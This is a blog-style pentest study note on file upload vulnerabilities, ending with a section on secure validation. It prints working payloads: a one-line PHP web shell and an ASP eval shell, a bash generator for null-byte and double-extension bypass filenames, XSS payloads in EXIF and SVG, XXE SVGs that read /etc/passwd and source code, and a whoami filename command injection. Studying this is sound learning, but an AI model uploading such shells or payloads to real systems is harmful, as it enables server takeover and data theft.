---
title: Notes | File Upload
author: Zeropio
date: 2022-07-30
categories: [Notes, Vulnerabilities]
tags: [upload]
permalink: /notes/vulnerabilities/file-upload
---

If the user input and uploaded files are not correctly filtered and validated, attackers may be able to exploit the file upload feature to perform malicious activities, like executing arbitrary commands on the back-end server to take control over it. Examples of these attacks include:
- Introducing other vulnerabilities like **XSS** or **XXE**.
- Causing a **Denial of Service** (**DoS**) on the back-end server.
- Overwriting critical system files and configurations.


---

# Basic Explotation 

## Absent Validation 

The most basic type of file upload vulnerability occurs when the web application does not have any form of validation filters on the uploaded files. With these types of vulnerable web apps, we may directly upload our web shell or reverse shell script to the web application, and then by just visiting the uploaded script, we can interact with our web shell or send the reverse shell. 

Many kinds of scripts can help us exploit web applications through arbitrary file upload, most commonly a **Web Shell script** and a **Reverse Shell script**. A web shell has to be written in the same programming language that runs the web server. So, the first step would be to identify what language runs the web application. In certain web frameworks and web languages, Web Routes are used to map URLs to web pages, in which case the web page extension may not be shown. Furthermore, file upload exploitation would also be different, as our uploaded files may not be directly routable or accessible.

One easy method to determine what language runs the web application is to visit the `/index.ext`{: .filepath} page, where we would swap out ext with various common web extensions (like **php**, **asp**, **aspx**). We can also fuzz for extensions or using Wappalyzer.

Now we can test whether we can upload a file with the same extension. Create a simple php file:
```php
<?php echo "Hello";?>
```

If the file is uploaded we can ensure that  the web application has no file validation on the back-end. Access to the file to test if it is working.

## Upload Exploitation 

### Web Shells

We can find many excellent web shells online that provide useful features, for example [phpbash](https://github.com/Arrexel/phpbash) or [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells). We can download any of this and upload. Also we can create our own web shells, for example in PHP:
```php
<?php system($_REQUEST['cmd']); ?>
```

Sending it and then searching in the URL: `http://<target>/shell.php?cmd=<command>`. The same example for **.NET**:
```javascript
<% eval request('cmd') %>
```

In certain cases, web shells may not work. This may be due to the web server preventing the use of some functions utilized by the web shell (like `system()`) or by WAFs.

### Reverse Shells 

We also can upload reverse shells, like the [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell) or [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells). Remember to change the parameters in the reverse shell scripts (our IP, port,...) and open a netcat.

We can also make our own with `msfvenom`.

> More info about shells [here](/notes/system/shell).
{: .prompt-info}

---

# Bypassing Filters 

## Client-Side Validation 

Many web applications only rely on front-end JavaScript code to validate the selected file format before it is uploaded and would not upload it if the file is not in the required format. Any code that runs on the client-side is under our control. We can either modify the upload request to the back-end server, or we can manipulate the front-end code to disable these type validations.

Intercept the request with Burp and modify the values to send our script. For example, sending an image, intercepting and then modify the file to our script. It is also possible to need to modify the **Content-Type**.

Other method is disabling the front-end validation. As these functions are being completely processed within our web browser, we have complete control over them. Use the Developer Tools to inspect the page and search for the validation function. Remove it or modify it to upload our file.

## Blacklist Filters 

### Blacklisting Extensions 

There are generally two common forms of validating a file extension on the back-end:
- Testing against a **blacklist** of types
- Testing against a **whitelist** of types

Furthermore, the validation may also check the **file type** or the **file content** for type matching. The weakest form of validation amongst these is testing the **file extension** against a blacklist of extension. For example, the following piece of code checks if the uploaded file extension is PHP and drops the request if it is:
```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```

This "security" it is not comprehensive, as many other extensions are not included in this list, which may still be used to execute PHP code on the back-end server if uploaded.

> The comparison above is also case-sensitive, and is only considering lowercase extensions. In Windows Servers, file names are case insensitive.
{: .prompt-info}

We can start by fuzzing extensions to test which are blaclisted. We can use wordlist from PayloadsAllTheThings, which have for [PHP](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) and [.NET](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP) extensions. Also, [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) have their own. We can fuzz with **ffuf**, **Burp**,...

## Non-Blacklisted Extensions 

Not all extensions will work with all web server configurations, so we may need to try several extensions to get one that successfully executes PHP code.

## Whitelist Filters 

The other type of file extension validation is by utilizing a whitelist of allowed file extensions. A whitelist is generally more secure than a blacklist. Try to fuzz some extensions. In somecases the web may allow some malicious extensions with the following code:
```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

The script uses a **regex** function to find the extensions. The issue here lies within the regex, as it only checks whether the file name **contains** the extension and not if it actually **ends** with it.

One easy bypass is the double extensions. Files like `.jpg.php`. However, this may not always work, as some web applications may use a strict regex pattern, as mentioned earlier, like the following:
```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
```

This pattern should only consider the final file extension, as it uses (`^.*\.`) to match everything up to the last `.`, and then uses `$` at the end to only match extensions that end the file name. 

Other technique is the reverse double extension. Even if the file upload functionality uses a strict regex pattern that only matches the final extension in the file name, the organization may use the insecure configurations for the web server. For example, the `/etc/apache2/mods-enabled/php7.4.conf`{: .filepath} for the Apache2 web server may include the following configuration:
```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

The above configuration is how the web server determines which files to allow PHP code execution. It specifies a whitelist with a regex pattern that matches `.phar`, `.php`, and `.phtml`. However, this regex pattern can have the same mistake we saw earlier if we forget to end it with `$`.

> The web application may still utilize a blacklist to deny requests containing PHP extensions.
{: .prompt-alert}


Also there is the character injection. Injecting several character before the extension cause the web application to misinterpret the filename and execute the uploaded file as a PHP script. The following are some of the characters we may try injecting:
- `%20`
- `%0a`
- `%00`
- `%0d0a`
- `/`
- `.\`
- `.`
- `…`
- `:`

Each character has a specific use case that may trick the web application to misinterpret the file extension. For example, (`shell.php%00.jpg`) works with PHP servers with version **5.X** or earlier, as it causes the PHP web server to end the file name after the (`%00`), and store it as (`shell.php`), while still passing the whitelist. We can write a small bash script that generates all permutations of the file name, where the above characters would be injected before and after both the PHP and JPG extensions, as follows:
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

## Type Filters 

Many modern web servers and web applications also test the content of the uploaded file to ensure it matches the specified type.There are two common methods for validating the file content: **Content-Type Header** or **File Content**.

### Content-Type 

The following is an example of how a PHP web application tests the Content-Type header to validate the file type:
```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

We can fuzz the header **Content-Type** with [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt) to check which is allowed. Upload then our file with the correct header (for example `image/jpg`).

> A file upload HTTP request has two Content-Type headers, one for the attached file (at the bottom), and one for the full request (at the top). We usually need to modify the file's Content-Type header, but in some cases the request will only contain the main Content-Type header, in which case we will need to modify the main Content-Type header.
{: .prompt-info}

### MIME-Type 

The second and more common type of file content validation is testing the uploaded file's **MIME-Type** (**Multipurpose Internet Mail Extensions**). This is usually done by inspecting the first few bytes of the file's content, which contain the File Signature or Magic Bytes. 

> Many other image types have non-printable bytes for their file signatures, while a GIF image starts with ASCII printable bytes, so it is the easiest to imitate. Furthermore, as the string **GIF8** is common between both GIF signatures, it is usually enough to imitate a GIF image.
{: .prompt-tip}

With the command `file` we can check the type of file. A php program who check on the MIME can be as:
```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

Adding `GIF8` at the start of our request in Burp would make the file seem like a GIF file. 

---

# Other Upload Attacks 

## XSS 

The most basic example is when a web application allows us to upload HTML files. If the target sees a link from a website they trust, and the website is vulnerable to uploading HTML documents, it may be possible to trick them into visiting the link and carry the attack on their machines. Another example of XSS attacks is web applications that display an image's metadata after its upload. For example:
```console
zero@pio$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' Dog.png
zero@pio$ exiftool Dog.png
...
Comment                         :  "><img src=1 onerror=alert(window.origin)>
...
```

When the image's metadata is displayed, the XSS payload should be triggered, and the JavaScript code will be executed to carry the XSS attack. Furthermore, if we change the image's MIME-Type to text/html, some web applications may show it as an HTML document instead of an image, in which case the XSS payload would be triggered even if the metadata wasn't directly displayed. XSS attacks can also be carried with **SVG** images. **Scalable Vector Graphics** (**SVG**) images are XML-based, and they describe 2D vector graphics. For example:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert("window.origin");</script>
</svg>
```

## XXE 

Similar attacks can be carried to lead to XXE exploitation. The following example can be used for an SVG image that leaks the content of `/etc/passwd`{: .filepath}:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

 For File Upload exploitation, it may allow us to locate the upload directory, identify allowed extensions, or find the file naming scheme, which may become handy for further exploitation. To use XXE to read source code in PHP web applications, we can use the following payload in our SVG image:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

## DoS 

We can utilize a **Decompression Bomb** with file types that use data compression, like ZIP archives. Another possible DoS attack is a **Pixel Flood** attack with some image files that utilize image compression, like JPG or PNG. We can create any JPG image file with any image size (e.g. `500x500`), and then manually modify its compression data to say it has a size of (`0xffff x 0xffff`), which results in an image with a perceived size of **4 Gigapixels**.

## Injections in File Name 

A common file upload attack uses a malicious string for the uploaded file name, which may get executed or processed if the uploaded file name is displayed on the page. For example, if we name a file `file$(whoami).jpg` or `file.jpg||whoami`, and then the web application attempts to move the uploaded file with an OS command, then our file name would inject the whoami command, which would get executed, leading to remote code execution.

## Upload Directory Disclosure 

In some file upload forms, like a feedback form or a submission form, we may not have access to the link of our uploaded file and may not know the uploads directory. In such cases, we may utilize fuzzing to look for the uploads directory or even use other vulnerabilities to find where the uploaded files are by reading the web applications source code.

## Windows-specific Attacks 

One such attack is using reserved characters, such as (`|`, `<`, `>`, `*`, or `?`), which are usually reserved for special uses like wildcards. We may use Windows reserved names for the uploaded file name, like (**CON**, **COM1**, **LPT1**, or **NUL**), which may also cause an error as the web application will not be allowed to write a file with this name. Finally, we may utilize the Windows 8.3 Filename Convention to overwrite existing files or refer to files that do not exist.

## Advanced File Upload Attacks 

Any automatic processing that occurs to an uploaded file, like encoding a video, compressing a file, or renaming a file, may be exploited if not securely coded. Some commonly used libraries may have public exploits for such vulnerabilities, like the AVI upload vulnerability leading to XXE in **ffmpeg**. However, when dealing with custom code and custom libraries, detecting such vulnerabilities requires more advanced knowledge and techniques, which may lead to discovering an advanced file upload vulnerability in some web applications.

---

# Preventing File Upload Vulnerabilities 

## Extension Validation 

A good example of secure code for extension validation:
```php
$fileName = basename($_FILES["uploadFile"]["name"]);

// blacklist test
if (preg_match('/^.+\.ph(p|ps|ar|tml)/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// whitelist test
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
    echo "Only images are allowed";
    die();
}
```
The web application checks if the extension exists anywhere within the file name, while with whitelists, the web application checks if the file name ends with the extension. 

## Content Validation 

The following example shows us how we can validate the file extension through whitelisting, and validate both the File Signature and the HTTP Content-Type header, while ensuring both of them match our expected file type:
```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// whitelist test
if (!preg_match('/^.*\.png$/', $fileName)) {
    echo "Only PNG images are allowed";
    die();
}

// content test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!in_array($type, array('image/png'))) {
        echo "Only SVG images are allowed";
        die();
    }
}
```

## Upload Disclosure 

Another thing we should avoid doing is disclosing the uploads directory or providing direct access to the uploaded file. If we utilize a download page, we should make sure that the `download.php` script only grants access to files owned by the users and that the users do not have direct access to the uploads directory. This can be achieved by utilizing the **Content-Disposition** and **nosniff** headers and using an accurate **Content-Type** header.

## Further Security 

For example, to do so in PHP, we can use the `disable_functions` configuration in php.ini and add such dangerous functions, like `exec`, `shell_exec`, `system`, `passthru`, and a few others. The following are a few other tips we should consider for our web applications:
- Limit file size
- Update any used libraries
- Scan uploaded files for malware or malicious strings
- Utilize a Web Application Firewall (WAF) as a secondary layer of protection

